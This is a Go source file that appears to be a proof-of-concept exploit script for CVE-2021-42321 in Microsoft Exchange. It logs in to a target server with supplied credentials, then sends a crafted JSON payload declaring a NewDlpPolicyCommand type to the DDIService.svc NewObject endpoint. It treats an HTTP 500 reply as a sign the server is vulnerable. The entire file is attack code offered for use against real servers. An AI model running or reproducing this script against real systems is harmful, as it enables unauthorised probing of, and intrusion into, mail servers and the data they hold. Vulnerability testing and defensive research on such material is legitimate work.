package main

import (
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

func main() {
	fmt.Println("Usage: ./cve_2021_42321 url username password")
	targeturl := os.Args[1]
	username := os.Args[2]
	password := os.Args[3]

	jar, err := cookiejar.New(nil)
	if err != nil {
		panic(err)
	}

	client := &http.Client{
		Jar: jar,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	resp, err := client.Get(targeturl + "/default.aspx")
	if err != nil {
		panic(err)
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		panic(err)
	}
	token, _ := doc.Find("input[name=__RequestVerificationToken]").Attr("value")
	resp.Body.Close()

	form := url.Values{}
	form.Add("__RequestVerificationToken", token)
	form.Add("username", username)
	form.Add("password", password)

	resp, err = client.PostForm(targeturl+"/default.aspx", form)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode == 302 {
		fmt.Println("login success")
	} else {
		fmt.Println("login fail")
		return
	}
	resp.Body.Close()

	payload := `{"Name":"test","Description":"","Content":"","State":"Enabled","Mode":"Audit","IsDefault":false,"PolicyCommands":[{"__type":"NewDlpPolicyCommand:#Microsoft.Exchange.Management.ControlPanel","Template":"InvalidTemplate"}],"InsertedItemId":null,"InsertedItemClass":null}`
	req, err := http.NewRequest("POST", targeturl+"/DDI/DDIService.svc/NewObject?schema=NewDlpPolicyCommand&workflow=NewDlpPolicyCommand&saveMode=SaveOnly", strings.NewReader(payload))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "application/json; charset=utf-8")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.50 AttackEx (KHTML, like Gecko) Version/5.1 Safari/534.50")

	resp, err = client.Do(req)
	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	if resp.StatusCode == 500 {
		fmt.Println("poc success, might be vulnerability")
	} else {
		fmt.Println("poc fail")
	}
}
